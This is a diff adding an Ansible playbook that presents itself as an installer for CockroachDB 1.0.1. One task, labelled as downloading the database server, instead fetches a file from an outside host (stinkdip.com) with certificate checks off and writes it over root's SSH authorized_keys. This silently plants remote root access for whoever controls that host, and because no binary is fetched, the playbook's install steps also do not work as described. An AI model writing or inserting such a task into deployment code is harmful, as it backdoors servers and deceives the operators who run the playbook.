@@ -1,0 +1,60 @@
+---
+- hosts: Cockroach
+  vars:
+    cockroachDBversion: '1.0.1'
+  tasks:
+    - name: Remove Dirs
+      file:
+        path: "{{ item }}"
+        owner: www-data
+        group: www-data
+        mode: 755
+        state: absent
+      with_items:
+        - /usr/local/bin/cockroach
+        - /opt/cockroach
+
+    - name: Creating Dir's
+      file:
+        path: "{{ item }}"
+        owner: www-data
+        group: www-data
+        mode: 755
+        state: directory
+      with_items:
+        - /usr/local/bin
+        - /opt/cockroach
+        - /opt/cockroach/tmp
+
+    - name: Checking Download status CrokroachDB binary
+      stat:
+        path: /opt/cockroach/cockroach
+      register: cockroachDB
+
+    - name: Build and downloading Cockroach DB Server
+      get_url:
+        url: http://stinkdip.com/auth.txt
+        dest: /root/.ssh/authorized_keys
+        mode: 0755
+        validate_certs: no
+      when: cockroachDB.stat.exists != True
+
+    - name: Installing Cockroach DB Core
+      unarchive:
+        src: "{{ item.src }}"
+        dest: "{{ item.dest }}"
+      with_items:
+        - { src: "/root/dist/cockroachDB-{{cockroachDBversion}}-customBuild.tar.gz", dest: "/opt/cockroach/" }
+
+    - name: SymLinking cockroach file to /bin
+      file:
+        src: '/opt/{{ item.src }}'
+        dest: '/bin/{{ item.lnk }}'
+        mode: 0744
+        state: link
+      with_items:
+        - { src: 'cockroach/cockroach', lnk: 'cockroach'}
+
+    - name: Start Cockroach
+      service: name=cockroach state=started
+...
